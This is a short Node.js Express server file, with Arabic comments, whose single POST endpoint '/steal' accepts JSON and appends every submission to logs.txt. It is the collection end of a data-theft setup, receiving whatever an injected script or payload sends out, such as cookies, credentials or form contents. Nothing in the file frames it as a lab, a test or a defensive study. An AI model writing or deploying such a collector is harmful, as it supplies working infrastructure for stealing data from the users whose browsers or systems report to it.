const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

// لدعم استقبال JSON في POST
app.use(bodyParser.json());

app.post('/steal', (req, res) => {
  console.log('Received data:', req.body);

  // خزّن البيانات في ملف logs.txt
  fs.appendFile('logs.txt', JSON.stringify(req.body) + '\n', (err) => {
    if (err) {
      console.error('Failed to write to file:', err);
    }
  });

  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});
